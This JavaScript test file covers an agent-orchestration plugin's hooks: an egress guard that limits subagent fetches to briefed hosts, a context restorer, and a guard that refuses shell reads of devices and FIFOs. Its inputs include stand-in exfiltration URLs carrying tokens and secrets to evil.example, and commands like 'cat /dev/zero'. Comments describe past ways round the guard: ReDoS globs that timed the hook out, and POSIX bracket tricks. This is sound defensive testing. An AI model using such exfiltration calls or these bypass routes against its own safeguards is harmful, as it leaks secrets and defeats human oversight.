  const other = run(EGRESS, fetchInput("https://evil.example/", "afg1", "implementer"));
  assert.deepEqual([other.code, other.stdout], [0, ""]);
  for (const bad of ["", "{", "null", JSON.stringify({ agent_type: "reviewer", tool_name: "WebFetch" })]) {
    const r = run(EGRESS, bad);
    assert.deepEqual([r.code, r.stdout], [0, ""], bad);
  }
  for (const r of [allow, deny, unv, wf, off, other]) noDecision(r);
  const gates = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).filter((g) => g.gate === "egress");
  assert.deepEqual(gates.map((g) => [g.decision, g.reason, g.host]), [
    ["allow", "host_in_brief", "cited.example"],
    ["deny", "host_not_in_brief", "evil.example"],
    ["allow", "egress_unverified", "any.example"],
    ["allow", "host_in_brief", "wf.example"],
  ]);
  const text = JSON.stringify(gates);
  assert.doesNotMatch(text, /token|leak|Review the change|https?:/); // C7: hosts only
});

// Audit 2026-11-16 T-6: without a subagent transcript (headless runs keep none) the guard decides from the reviewer's
// launch record (its urls and sources hosts, and its slice's planned FILES); only with no launch record either is the
// fetch allowed as egress_unverified.
test("egress guard (T-6): no transcript, so the launch record's hosts and the slice's planned files decide", () => {
  const launches = join(stateDir, "journal-launches.jsonl");
  const add = (/** @type {string} */ agentId, /** @type {string} */ prompt, /** @type {string} */ sid = SID) =>
    writeFileSync(launches, `${JSON.stringify(launchRecord({ subagent_type: "orchestration:reviewer", prompt }, { sessionId: sid, agentId }))}\n`, { flag: "a" });
  add("ahl1", "SLICE: s1\nSOURCES: https://src.example:8443/a, docs/links.md\nCHECKS: C1\nC1: matches https://launch.example/spec\nReview the change.");
  add("ahl2", "SLICE: s7\nReview the change.");
  add("ahl3", "SLICE: s1\nReview the change against https://other-session.example/x.", "another-session");
  const o = { dir: stateDir, env: env() };
  for (const id of ["ahl1", "ahl2", "ahl3"]) assert.equal(agentTranscript(mainTranscript, id), null, "no subagent transcript");
  for (const [url, id, want] of /** @type {[string, string, string][]} */ ([
    ["https://launch.example/other", "ahl1", "allow"],
    ["https://src.example:8443/b", "ahl1", "allow"],
    ["https://files.example/x", "ahl1", "allow"], // s1's planned files
    ["https://second.example/x", "ahl1", "allow"],
    ["https://evil.example/?q=secret", "ahl1", "deny"],
    ["https://src.example/b", "ahl1", "deny"], // another port
    ["https://evil.example/?q=secret", "ahl2", "deny"], // a launch record that names no host: nothing is allowed
    ["https://other-session.example/x", "ahl3", "unverified"], // its launch record is another session's
  ])) {
    assert.equal(egressDecision(fetchInput(url, id), o).decision, want, `${id} ${url}`);
  }
  const d = egressDecision(fetchInput("https://evil.example/?q=secret", "ahl1"), o);
  assert.match(String(d.reason), /launch\.example/);
  assert.doesNotMatch(String(d.reason), /secret/);
  // The hook: exit 2 for the denial, logged as host_not_in_brief with the host only.
  const r = run(EGRESS, fetchInput("https://evil.example/leak?token=abc", "ahl1"));
  assert.equal(r.code, 2);
  assert.match(r.stderr, /evil\.example/);
  noDecision(r);
  const g = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).at(-1);
  assert.deepEqual([g.gate, g.decision, g.reason, g.host, g.agent_id], ["egress", "deny", "host_not_in_brief", "evil.example", "ahl1"]);
});

// ---- compact context ----

test("compact-context: open run → SessionStart additionalContext with slices, files, states and constraints", () => {
  const sid = "sess-compact";
  const t0 = Date.now() - 60_000;
  const at = (/** @type {number} */ s) => new Date(t0 + s * 1000).toISOString();
  const bigPlan = "PLAN REVIEW\nCONSTRAINTS:\nC1: tests pass\nC2: no new dependencies\nSLICE: a\nFILES: src/a.ts\nDEPENDS: none\nGOAL: a\nSLICE: b\nFILES: src/b.ts, src/b.test.ts\nDEPENDS: a\nGOAL: b\nRISKY: yes\nSLICE: c\nFILES: src/c.ts\nDEPENDS: none\nGOAL: c\n";
  const launches = [
    launchRecord({ subagent_type: "reviewer", prompt: bigPlan }, { sessionId: sid, agentId: "p1", ts: at(0) }),
    launchRecord({ subagent_type: "implementer", prompt: "SLICE: a\nFILES: src/a.ts\nDEPENDS: none" }, { sessionId: sid, agentId: "i1", ts: at(2) }),
    launchRecord({ subagent_type: "reviewer", prompt: "SLICE: a" }, { sessionId: sid, agentId: "r1", ts: at(4) }),
    launchRecord({ subagent_type: "implementer", prompt: "SLICE: b\nFILES: src/b.ts, src/b.test.ts\nDEPENDS: a" }, { sessionId: sid, agentId: "i2", ts: at(6) }),
  ];
  const stops = [
    stopRecord({ sessionId: sid, agentId: "p1", role: "reviewer", slice: "plan", reply: "STATUS: pass", ts: at(1) }),
    stopRecord({ sessionId: sid, agentId: "i1", role: "implementer", slice: "a", reply: "STATUS: pass", ts: at(3) }),
    stopRecord({ sessionId: sid, agentId: "r1", role: "reviewer", slice: "a", reply: "STATUS: pass", ts: at(5) }),
  ];
  const dir = join(scratch, "compact-project");
  const sdir = join(dir, ".claude", "state");
  mkdirSync(sdir, { recursive: true });
  writeFileSync(join(sdir, "journal-launches.jsonl"), launches.map((l) => JSON.stringify(l)).join("\n") + "\n");
  writeFileSync(join(sdir, "journal.jsonl"), stops.map((l) => JSON.stringify(l)).join("\n") + "\n");
  // The project registers its own copy, so the hook (project copy, no --plugin) uses <project>/.claude/state.
  const r = spawnSync(process.execPath, [COMPACT], { input: JSON.stringify({ session_id: sid, hook_event_name: "SessionStart", source: "compact", cwd: dir }), env: { ...env(), CLAUDE_PROJECT_DIR: dir }, encoding: "utf8" });
  assert.equal(r.status, 0);
  const out = JSON.parse(r.stdout);
  assert.equal(out.hookSpecificOutput.hookEventName, "SessionStart");
  const ctx = out.hookSpecificOutput.additionalContext;
  assert.match(ctx, /- a: passed FILES: src\/a\.ts/);
  assert.match(ctx, /- b: building or reviewing \(1 attempt\), RISKY FILES: src\/b\.ts, src\/b\.test\.ts/);
  assert.match(ctx, /- c: pending FILES: src\/c\.ts/);
  assert.match(ctx, /C1: tests pass\nC2: no new dependencies/);
  assert.ok(ctx.length <= MAX_CONTEXT);
  noDecision(r);

  // Another session, a startup source and malformed input: silence.
  for (const input of [{ session_id: "other", source: "compact" }, { session_id: sid, source: "startup" }, "nope", "", { source: "compact" }]) {
    const q = spawnSync(process.execPath, [COMPACT], { input: typeof input === "string" ? input : JSON.stringify(input), env: { ...env(), CLAUDE_PROJECT_DIR: dir }, encoding: "utf8" });
    assert.deepEqual([q.status, q.stdout], [0, ""], JSON.stringify(input));
  }
});

test("compact-context: no state at all → silent; the context is capped", () => {
  const r = run(COMPACT, { session_id: "nobody", source: "compact" });
  assert.deepEqual([r.code, r.stdout, r.stderr], [0, "", ""]);
  const slices = Object.fromEntries(
    Array.from({ length: 60 }, (_, i) => [`slice-${i}`, { files: [`src/some/long/path/file-${i}.ts`], passed: false, gaveUp: false, attempts: 0, launches: 0, reviews: [], lastImplAt: null, risky: false }]),
  );
  const ctx = runContext({ id: 1, kind: "planned", planned: Object.keys(slices), slices, constraints: { C1: "x".repeat(300) }, planReviewed: true });
  assert.ok(ctx.length <= MAX_CONTEXT, String(ctx.length));
  assert.match(ctx, /- slice-0: pending/);
  assert.match(ctx, /\+\d+ more slices/);
  assert.ok(ctx.includes(`C1: ${"x".repeat(200)}\n`));
  assert.ok(ctx.endsWith("Every slice still needs a passing review before the final report."));
});

// The runContext of commit b13b2ca (before b4), kept to compare against: it cut the whole text from the end.
const REMINDER = "Every slice still needs a passing review before the final report.";
/** @param {any} run */
function oldRunContext(run) {
  const state = (/** @type {any} */ s) => (s.passed ? "passed" : s.gaveUp ? "failed for good" : "pending");
  const ids = run.kind === "planned" && run.planned.length ? run.planned : Object.keys(run.slices);
  const lines = [`Orchestration run ${run.id} is still open in this session (${run.kind}${run.planReviewed ? ", plan reviewed" : ""}). Slices:`];
  for (const id of ids) {
    const s = run.slices[id];
    if (!s) {
      lines.push(`- ${id}: pending`);
      continue;
    }
    const files = s.files.length ? ` FILES: ${s.files.slice(0, 8).join(", ")}${s.files.length > 8 ? ", ..." : ""}` : "";
    lines.push(`- ${id}: ${state(s)}${s.risky ? ", RISKY" : ""}${files}`);
  }
  const constraints = Object.entries(run.constraints ?? {});
  if (constraints.length) {
    lines.push("Constraints:");
    for (const [id, text] of constraints) lines.push(`${id}: ${String(text).slice(0, 200)}`);
  }
  lines.push(REMINDER);
  const text = lines.join("\n");
  return text.length <= MAX_CONTEXT ? text : `${text.slice(0, MAX_CONTEXT - 16).trimEnd()}\n[... truncated]`;
}

test("compact-context: sweep against the old output; constraints cut only when they alone do not fit (b4)", () => {
  let cases = 0;
  let fitted = 0;
  let cut = 0;
  for (let n = 0; n <= 60; n++) {
    const slices = Object.fromEntries(
      Array.from({ length: n }, (_, i) => [`s${i}`, { files: i % 3 ? [`src/a/file-${i}.ts`, `src/b/${i}.ts`] : [], passed: i % 4 === 0, gaveUp: i % 7 === 1, attempts: 0, launches: 0, reviews: [], lastImplAt: null, risky: i % 5 === 2 }]),
    );
    for (let k = 0; k <= 8; k++) {
      for (const size of [12, 150, 200, 260]) {
        const constraints = Object.fromEntries(Array.from({ length: k }, (_, i) => [`C${i + 1}`, `${String.fromCharCode(97 + i)}`.repeat(size)]));
        const run = { id: 3, kind: "planned", planned: Object.keys(slices), slices, constraints, planReviewed: true };
        const got = runContext(run);
        const old = oldRunContext(run);
        const label = `${n} slices, ${k} constraints of ${size}`;
        cases++;
        if (!old.endsWith("[... truncated]")) {
          fitted++;
          assert.equal(got, old, label);
        }
        assert.ok(got.length <= MAX_CONTEXT, `${label}: ${got.length}`);
        assert.ok(got.endsWith(REMINDER), label);
        const block = k ? `Constraints:\n${Object.entries(constraints).map(([id, t]) => `${id}: ${t.slice(0, 200)}`).join("\n")}\n` : "";
        const head = got.split("\n")[0] ?? "";
        const minimal = `${head}\n${n ? `- +${n} more slices\n` : ""}${block}${REMINDER}`;
        if (!got.includes(block)) {
          cut++;
          assert.ok(minimal.length > MAX_CONTEXT, `${label}: a constraint was cut although constraints and reminder fit`);
        }
        const shown = (got.match(/^- s\d+:/gm) ?? []).length;
        const more = Number(/^- \+(\d+) more slices$/m.exec(got)?.[1] ?? 0);
        assert.equal(shown + more, n, label);
      }
    }
  }
  assert.ok(fitted > 0 && cut > 0 && cases > fitted, `${cases} ${fitted} ${cut}`);
});

test("compact-context: with many slices the constraints and the final reminder survive the cap (b4)", () => {
  const slices = Object.fromEntries(
    Array.from({ length: 40 }, (_, i) => [`slice-${i}`, { files: [`src/some/long/path/file-${i}.ts`, `src/other/${i}.ts`], passed: i < 3, gaveUp: false, attempts: 0, launches: 0, reviews: [], lastImplAt: null, risky: false }]),
  );
  const constraints = Object.fromEntries(Array.from({ length: 5 }, (_, i) => [`C${i + 1}`, `${i}`.repeat(250)]));
  const ctx = runContext({ id: 7, kind: "planned", planned: Object.keys(slices), slices, constraints, planReviewed: true });
  assert.ok(ctx.length <= MAX_CONTEXT, String(ctx.length));
  assert.match(ctx, /^Orchestration run 7 is still open/);
  for (let i = 0; i < 5; i++) assert.ok(ctx.includes(`C${i + 1}: ${`${i}`.repeat(200)}\n`), `C${i + 1}`);
  assert.ok(ctx.endsWith("Every slice still needs a passing review before the final report."));
  const shown = (ctx.match(/^- slice-\d+/gm) ?? []).length;
  const more = Number(/\+(\d+) more slices/.exec(ctx)?.[1]);
  assert.ok(shown >= 1, String(shown));
  assert.equal(shown + more, 40);
  // a run that fits keeps every slice line whole, with no marker
  const small = runContext({ id: 8, kind: "planned", planned: ["a"], slices: { a: slices["slice-0"] }, constraints: { C1: "short" }, planReviewed: true });
  assert.match(small, /- a: passed FILES: src\/some\/long\/path\/file-0\.ts, src\/other\/0\.ts/);
  assert.doesNotMatch(small, /more slices|truncated/);
});

test("no hook source prints an allow or ask permission decision (C6)", () => {
  for (const f of ["researcher-guard.mjs", "egress-guard.mjs", "compact-context.mjs", "worktree-head.mjs", "skill-gate.mjs", "skill-seal.mjs"]) {
    if (!existsSync(hook(f))) continue;
    const src = readFileSync(hook(f), "utf8");
    assert.doesNotMatch(src, /permissionDecision|"ask"|decision:\s*"approve"/, f);
  }
});

test("plugin copies exit early on duplicate() when the project registers the same script (C4)", () => {
  const dup = join(scratch, "dup-project");
  mkdirSync(join(dup, ".claude", "hooks"), { recursive: true });
  const scripts = ["researcher-guard.mjs", "egress-guard.mjs", "compact-context.mjs"];
  for (const s of scripts) writeFileSync(join(dup, ".claude", "hooks", s), "");
  writeFileSync(join(dup, ".claude", "settings.json"), JSON.stringify({ hooks: scripts.map((s) => `node .claude/hooks/${s}`) }));
  /** @param {string} script @param {unknown} input */
  const plugin = (script, input) => spawnSync(process.execPath, [script, "--plugin"], { input: JSON.stringify(input), env: { ...env(), CLAUDE_PROJECT_DIR: dup }, encoding: "utf8" });
  const r1 = plugin(RESEARCHER, bash("python3 x.py"));
  assert.deepEqual([r1.status, r1.stdout, r1.stderr], [0, "", ""]);
  const r2 = plugin(EGRESS, fetchInput("https://evil.example/", "afg1"));
  assert.deepEqual([r2.status, r2.stdout, r2.stderr], [0, "", ""]);
  // Without the project registration the plugin copy does act.
  const lone = join(scratch, "lone-project");
  mkdirSync(lone, { recursive: true });
  const r3 = spawnSync(process.execPath, [RESEARCHER, "--plugin"], { input: JSON.stringify(bash("python3 x.py")), env: { ...env(), CLAUDE_PROJECT_DIR: lone }, encoding: "utf8" });
  assert.equal(r3.status, 2);
});

test("compact-context: a closed run and a stale run are silent", () => {
  const sid = "sess-closed";
  const dir = join(scratch, "closed-project");
  const sdir = join(dir, ".claude", "state");
  mkdirSync(sdir, { recursive: true });
  const t0 = Date.now() - 60_000;
  const at = (/** @type {number} */ s) => new Date(t0 + s * 1000).toISOString();
  const onePlan = "PLAN REVIEW\nCONSTRAINTS:\nC1: tests pass\nSLICE: a\nFILES: src/a.ts\nDEPENDS: none\nGOAL: a\n";
  const launches = [
    launchRecord({ subagent_type: "reviewer", prompt: onePlan }, { sessionId: sid, agentId: "p1", ts: at(0) }),
    launchRecord({ subagent_type: "implementer", prompt: "SLICE: a\nFILES: src/a.ts\nDEPENDS: none" }, { sessionId: sid, agentId: "i1", ts: at(2) }),
    launchRecord({ subagent_type: "reviewer", prompt: "SLICE: a" }, { sessionId: sid, agentId: "r1", ts: at(4) }),
  ];
  const stops = [
    stopRecord({ sessionId: sid, agentId: "p1", role: "reviewer", slice: "plan", reply: "STATUS: pass", ts: at(1) }),
    stopRecord({ sessionId: sid, agentId: "i1", role: "implementer", slice: "a", reply: "STATUS: pass", ts: at(3) }),
    stopRecord({ sessionId: sid, agentId: "r1", role: "reviewer", slice: "a", reply: "STATUS: pass", ts: at(5) }),
  ];
  const jsonl = (/** @type {unknown[]} */ rs) => rs.map((l) => JSON.stringify(l)).join("\n") + "\n";
  writeFileSync(join(sdir, "journal-launches.jsonl"), jsonl(launches));
  writeFileSync(join(sdir, "journal.jsonl"), jsonl(stops));
  const call = (/** @type {Record<string, string>} */ extra = {}) =>
    spawnSync(process.execPath, [COMPACT], { input: JSON.stringify({ session_id: sid, source: "compact" }), env: { ...env(extra), CLAUDE_PROJECT_DIR: dir }, encoding: "utf8" });
  const closed = call();
  assert.deepEqual([closed.status, closed.stdout], [0, ""]);
  // Drop the review: the run is open again, and stale with ORCH_RUN_STALE_MIN=0.25 after 55 s of quiet.
  writeFileSync(join(sdir, "journal.jsonl"), jsonl(stops.slice(0, 2)));
  assert.match(call().stdout, /- a: building or reviewing/);
  const stale = call({ ORCH_RUN_STALE_MIN: "0.25" });
  assert.deepEqual([stale.status, stale.stdout], [0, ""]);
});

// w3 second attempt, item 1: one budget (names read and a deadline) for the whole decision, cheap refusals first.
const wide = join(scratch, "w3-wide");
mkdirSync(join(wide, ".cache"), { recursive: true });
mkdirSync(join(wide, "src"), { recursive: true });
writeFileSync(join(wide, "src", "a.md"), "x\n");
for (let i = 0; i < 3000; i++) writeFileSync(join(wide, ".cache", `c${i}`), "");
const widePart = `rg x ${Array(10).fill("**/*.md").join(" ")}`;
const wideLine = Array(20).fill(widePart).join("; ");

test("researcher guard (w3 second attempt): a literal device after many glob words is refused at once, before any expansion", () => {
  const t0 = Date.now();
  const v = researcherViolation(`${wideLine}; cat /dev/zero`, wide, undefined, { totalNames: 0 });
  assert.ok(v);
  assert.match(v.reason, /cat \/dev\/zero reads a device/);
  assert.ok(Date.now() - t0 < 1000, `${Date.now() - t0} ms`);
  if (hasFifo) assert.match(researcherViolation(`${wideLine}; cat pipe`, w3, undefined, { totalNames: 0 })?.reason ?? "", /pipe reads a device/);
});

test("researcher guard (w3 second attempt): the names budget and the deadline hold for the whole command, with the way around", () => {
  // Default budget: the repeated pattern is expanded once, so the line is judged quickly and passes.
  const t0 = Date.now();
  assert.equal(researcherViolation(wideLine, wide), null);
  assert.ok(Date.now() - t0 < 2000, `${Date.now() - t0} ms`);
  // A budget smaller than the tree (the production default is far larger): refused, saying how to avoid it.
  const small = researcherViolation(wideLine, wide, undefined, { totalNames: 1000 });
  assert.ok(small);
  assert.match(small.reason, /too wide to judge/);
  assert.match(small.reason, /quote the glob so the command expands it itself/);
  assert.doesNotMatch(small.reason, /ORCH_/);
  // A deadline already passed: refused the same way, in no time.
  const t1 = Date.now();
  const late = researcherViolation(wideLine, wide, undefined, { deadlineMs: -1 });
  assert.match(late?.reason ?? "", /too wide to judge/);
  assert.ok(Date.now() - t1 < 500);
  // Everyday commands still pass with the default budget.
  for (const c of ["rg x **/*.md", "cat src/*.md", "head -5 src/a.md"]) assert.equal(researcherViolation(c, wide), null, c);
});

test("researcher guard (w3 second attempt, item 2): the wide reading judges only names the whole pattern can match", { skip: hasFifo ? false : "mkfifo unavailable" }, () => {
  const tree = join(scratch, "w3-fifo-match");
  for (const d of [".q", "src"]) mkdirSync(join(tree, d), { recursive: true });
  writeFileSync(join(tree, "src", "a.md"), "x\n");
  spawnSync("mkfifo", [join(tree, ".q", "p")]);
  for (const c of ["cat **/*.md", "rg x **/*.md"]) assert.equal(researcherViolation(c, tree), null, `${c} with .q/p`);
  spawnSync("mkfifo", [join(tree, ".q", "x.md")]);
  assert.match(researcherViolation("cat **/*.md", tree)?.reason ?? "", /x\.md reads a device/, "dotglob could reach .q/x.md");
  rmSync(join(tree, ".q", "x.md"));
  spawnSync("mkfifo", [join(tree, "src", "x.md")]);
  assert.match(researcherViolation("cat **/*.md", tree)?.reason ?? "", /x\.md reads a device/);
});

// w3 third attempt: a glob segment was a backtracking regular expression (`*` as `.*`, a bracket as `.+`), so one
// name of 60 letters against `*[a]*[a]*[a]*[a]q` kept the guard busy past any limit, and a hook cancelled for time does
// not block: the FIFO read after it ran. Names are now matched by a two-pointer matcher, the command's length and its
// `[`/`{` count are bounded before the tokenizer reads it, and the deadline is checked at every listed name.
const redos = join(scratch, "w3-redos");
mkdirSync(join(redos, "longn"), { recursive: true });
writeFileSync(join(redos, "longn", "a".repeat(60)), "x\n");
const redosFifo = spawnSync("mkfifo", [join(redos, "fifo")]).status === 0;
/** The hook run as Claude Code runs it, killed after 10 s. @param {string} command @param {string} cwd */
function hookTimed(command, cwd) {
  const t0 = Date.now();
  const r = spawnSync(process.execPath, [RESEARCHER], { input: JSON.stringify({ ...bash(command), cwd }), env: env(), cwd: project, encoding: "utf8", timeout: 10000, killSignal: "SIGKILL" });
  return { code: r.status, signal: r.signal, stderr: r.stderr ?? "", ms: Date.now() - t0 };
}
/** k bracket-star pairs as tokenizer pieces, then a literal. @param {number} k @param {string} tail */
const pairs = (k, tail) => [...Array.from({ length: k }, () => [{ glob: "*" }, { glob: "[]" }]).flat(), { lit: tail }];
/** The regular expression the guard built for a segment before the third attempt (small inputs only). @param {any[]} pieces */
const oldSegmentRe = (pieces) =>
  new RegExp(`^${pieces.map((p) => ("lit" in p ? p.lit.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") : p.glob === "*" ? ".*" : p.glob === "?" ? "." : ".+")).join("")}$`, "is");
/** A seeded generator, so a failing case can be replayed. @param {number} seed */
function prng(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

test("researcher guard (w3 third attempt): a bracket-star glob over a 60-letter name is judged at once, and the FIFO after it is refused", { skip: redosFifo ? false : "mkfifo unavailable" }, () => {
  for (const k of [4, 12, 40]) {
    const r = hookTimed(`cat longn/${"*[a]".repeat(k)}q ; cat fif?`, redos);
    assert.deepEqual([r.code, r.signal], [2, null], `${k} pairs: ${r.ms} ms ${r.stderr.slice(0, 160)}`);
    assert.match(r.stderr, /fifo reads a device that may never end/, `${k} pairs`);
    assert.ok(r.ms < 3000, `${k} pairs: ${r.ms} ms`);
  }
});

test("researcher guard (w3 third attempt): one segment match takes milliseconds for 60- and 4,000-letter names and 4, 12 or 40 bracket-star pairs", () => {
  assert.equal(typeof guard.matchSegment, "function", "the guard exports its segment matcher");
  for (const n of [60, 4000]) {
    const name = "a".repeat(n);
    for (const k of [4, 12, 40]) {
      const t0 = performance.now();
      assert.equal(guard.matchSegment(pairs(k, "q"), name), false, `${n} letters, ${k} pairs, no match`);
      assert.equal(guard.matchSegment(pairs(k, "a"), name), k < n, `${n} letters, ${k} pairs, a match`);
      assert.equal(guard.matchSegment(pairs(k, "q"), `${name}q`), k <= n, `${n} letters, ${k} pairs, q at the end`);
      const ms = performance.now() - t0;
      assert.ok(ms < 1000, `${n} letters, ${k} pairs: ${ms} ms`);
    }
  }
  // In-process, through the whole guard: the 60-letter name matched or not, decided at once.
  const t1 = Date.now();
  for (const k of [4, 12, 40]) {
    assert.equal(researcherViolation(`cat longn/${"*[a]".repeat(k)}q`, redos), null, `${k} pairs, no match`);
    assert.equal(researcherViolation(`cat longn/${"*[a]".repeat(k)}a`, redos), null, `${k} pairs, a match`);
  }
  assert.ok(Date.now() - t1 < 1000, `${Date.now() - t1} ms`);
});

test("researcher guard (w3 third attempt): the segment matcher keeps the old rules (case, dots, newlines, brackets as one or more characters)", () => {
  assert.equal(typeof guard.matchSegment, "function");
  const rand = prng(20261117);
  const alphabet = ["a", "A", "b", ".", "\n", "\r", "ß", "ſ", "S", "s", "K", "\u212a", "k", "İ", "i", "ı", "\ud800", "é", "É", "-", "[", "*", "\\", "$"];
  const pick = () => alphabet[Math.floor(rand() * alphabet.length)] ?? "a";
  for (let n = 0; n < 1500; n++) {
    /** @type {any[]} */
    const pieces = [];
    for (let k = Math.floor(rand() * 6); k > 0; k--) {
      const r = rand();
      if (r < 0.45) pieces.push({ lit: Array.from({ length: 1 + Math.floor(rand() * 3) }, pick).join("") });
      else pieces.push({ glob: r < 0.7 ? "*" : r < 0.85 ? "?" : "[]" });
    }
    const name = Array.from({ length: Math.floor(rand() * 8) }, pick).join("");
    assert.equal(guard.matchSegment(pieces, name), oldSegmentRe(pieces).test(name), `${JSON.stringify(pieces)} ${JSON.stringify(name)}`);
  }
});

test("researcher guard (w3 third attempt): everyday commands in a tree shaped like this repository still pass", () => {
  const tree = join(scratch, "w3-everyday");
  for (const d of ["src", "docs", ".claude/hooks", "node_modules/p"]) mkdirSync(join(tree, d), { recursive: true });
  for (const f of ["src/a.ts", "src/a.test.mjs", "src/b.test.ts", "docs/a.md", "docs/b.md", ".claude/hooks/x.mjs", "node_modules/p/i.ts", "README.md"]) writeFileSync(join(tree, f), "x\n");
  for (const c of ["rg -n x src", "rg x **/*.md", "grep -rn x docs", "ls src/*.test.*", "cat docs/*.md", "head -5 src/*.ts", "wc -l .claude/hooks/*.mjs", "find . -name '*.ts' -not -path './node_modules/*'"]) {
    assert.equal(researcherViolation(c, tree), null, c);
  }
});

test("researcher guard (w3 third attempt): quoted text is removed in linear time, with the old regular expression's result", () => {
  assert.equal(typeof guard.withoutQuoted, "function", "the guard exports its quote stripper");
  const rand = prng(7);
  const alphabet = ["'", '"', "\\", "<", ">", "a", " ", "\n", "\r", "\u2028", "\u2029"];
  for (let n = 0; n < 5000; n++) {
    const s = Array.from({ length: Math.floor(rand() * 24) }, () => alphabet[Math.floor(rand() * alphabet.length)]).join("");
    assert.equal(guard.withoutQuoted(s), s.replace(/'[^']*'|"(?:\\.|[^"\\])*"/g, ""), JSON.stringify(s));
  }
  // Escaped quotes that never close: each start used to rescan the rest of the line (seconds at 60,000 characters).
  const t0 = Date.now();
  assert.ok(researcherViolation(`cat x ${'\\"'.repeat(30000)} q`, redos));
  assert.ok(Date.now() - t0 < 1000, `${Date.now() - t0} ms`);
});

test("researcher guard (w3 third attempt): a command too long, or with too many brackets and braces, for the tokenizer is refused at once; shorter ones pass", () => {
  for (const c of [`cat ${"[".repeat(20000)}`, `cat ${"{".repeat(20000)}`, `cat ${"a{".repeat(10000)}`, `echo ${"x ".repeat(40000)}`, `find . -files0-from -${"a".repeat(60000)}`, `du --files0-from=-${"a".repeat(60000)}`]) {
    const t0 = Date.now();
    const v = researcherViolation(c, redos);
    assert.ok(v, c.slice(0, 30));
    assert.ok(Date.now() - t0 < 1000, `${c.slice(0, 30)}: ${Date.now() - t0} ms`);
  }
  assert.match(researcherViolation(`echo ${"x ".repeat(40000)}`, redos)?.reason ?? "", /too long to judge/);
  assert.match(researcherViolation(`echo ${"[a] ".repeat(300)}`, redos)?.reason ?? "", /too many/);
  assert.match(researcherViolation(`find . -files0-from ${"a".repeat(5000)}`, redos)?.reason ?? "", /too long to judge/);
  // The narrower rule: a long command of plain words, and a few brackets and braces, still pass.
  const t1 = Date.now();
  assert.equal(researcherViolation(`echo ${"x ".repeat(30000)}`, redos), null);
  assert.equal(researcherViolation(`grep -nE '[a-z]{3}|[0-9]{2,}' docs ${"x ".repeat(100)}`, redos), null);
  assert.equal(researcherViolation(`echo ${"[a] ".repeat(200)}`, redos), null);
  assert.ok(Date.now() - t1 < 1000, `${Date.now() - t1} ms`);
});

test("researcher guard (w3 third attempt): the deadline leaves room for a cold file cache and counts from the hook's start", () => {
  assert.ok(typeof guard.DEADLINE_MS === "number" && guard.DEADLINE_MS >= 10000, String(guard.DEADLINE_MS));
  assert.match(readFileSync(RESEARCHER, "utf8"), /researcherViolation\([^\n]*\{ fromProcessStart: true \}\)/);
  // A deadline that has passed refuses with the way around, also for a command with no glob to expand.
  assert.match(researcherViolation("cat a.txt; cat b.txt", redos, undefined, { deadlineMs: -1 })?.reason ?? "", /too wide to judge/);
  // Checked at each operand, so a line of 30,000 operands (about a second of stat calls) stops at the deadline.
  const t0 = Date.now();
  assert.match(researcherViolation(`cat${" a".repeat(30000)}`, redos, undefined, { deadlineMs: 50 })?.reason ?? "", /took too long to judge/);
  // The reason above shows the deadline fired (without it the line is judged in full and refused for another reason).
  // The wall-time bound only catches a check that runs far past it: about 430 ms of this call come before the first
  // operand on an idle machine, and a loaded one took 906 ms against the old 600 ms bound, so it leaves room for load.
  assert.ok(Date.now() - t0 < 3000, `${Date.now() - t0} ms`);
});

// w8: bracket expressions read as POSIX and the shells read them. The tokenizer closes a bracket at its first `]`, so
// `[[:alpha:]]` was matched as one or more characters followed by a literal `]`: in a folder holding a FIFO named `x`
// the guard passed `cat [[:alpha:]]` and bash expanded it to `x`. A bracket holding a slash is no bracket for bash, which
// passes `[a/b]` through as the literal path. The guard now reads each raw word itself, and judges every glob word
// also as the literal path it spells.
// One FIFO per folder (g1: `x`, gp: `%`, gb: `]`), beside one regular file, so no case is refused for another's name.
const w8 = join(scratch, "w8-brackets");
for (const d of ["g1", "gp", "gb"]) {
  mkdirSync(join(w8, d), { recursive: true });
  writeFileSync(join(w8, d, "notes.md"), "x\n");
}
mkdirSync(join(w8, "g2", "[a"), { recursive: true });
mkdirSync(join(w8, "gu"), { recursive: true });
const w8Fifo = [["g1", "x"], ["gp", "%"], ["gb", "]"], ["g2", "[a/b]"], ["gu", "é"]].every(([d, n]) => spawnSync("mkfifo", [join(w8, String(d), String(n))]).status === 0);

test("researcher guard (w8, G1 and G2): POSIX classes and a bracket holding a slash cannot reach a FIFO or a device", { skip: w8Fifo ? false : "mkfifo unavailable" }, () => {
  const g1 = join(w8, "g1");
  const g2 = join(w8, "g2");
  const gp = join(w8, "gp");
  const gb = join(w8, "gb");
  for (const [c, cwd] of [
    ["cat [[:alpha:]]", g1],
    ["cat [[:punct:]]", gp],
    ["cat /d[[:alpha:]]v/zero", g1],
    ["head -c 8 /de[[:lower:]]/zero", g1],
    ["cat [![:digit:]]", g1],
    ["cat [[:alpha:][:digit:]]", g1],
    ["cat [[=x=]]", g1],
    ["cat [[.x.]]", g1],
    ["cat []]", gb],
    ["cat [[:punct:]]", gb],
    ['cat [" "x]', g1], // a quoted space inside the bracket: the tokenizer saw no glob here
    // A name outside ASCII: in the C locale `??` is two bytes of `é`, and classes follow the locale.
    ["cat ??", join(w8, "gu")],
    ["cat [[:alpha:]]", join(w8, "gu")],
    ["cat [a/b]", g2],
    ["cat ./[a/b]", g2],
    ["cat [[]a/b]", g2],
    ["wc -l [a/b]", g2],
    ["grep x [a/b]", g2],
  ]) {
    const v = researcherViolation(String(c), String(cwd));
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, String(c));
  }
  // A backslash or a quote inside an unquoted bracket: the tokenizer steps over it, so the two readings disagree and the
  // command is refused as unreadable (a stated over-block: `cat '[\]]'`, or naming the file, passes).
  for (const c of ["cat [\\]]", "cat [\\]x]", 'cat ["]"]', "cat x[\\]]", "head -1 [!\\]]"]) {
    assert.match(researcherViolation(c, gb)?.reason ?? "", /cannot be read with confidence/, c);
  }
  // A glob in the command's name, and a glob in a sed or cd operand, are refused too.
  assert.match(researcherViolation("ca[t] notes.md", gb)?.reason ?? "", /not an allowed command/);
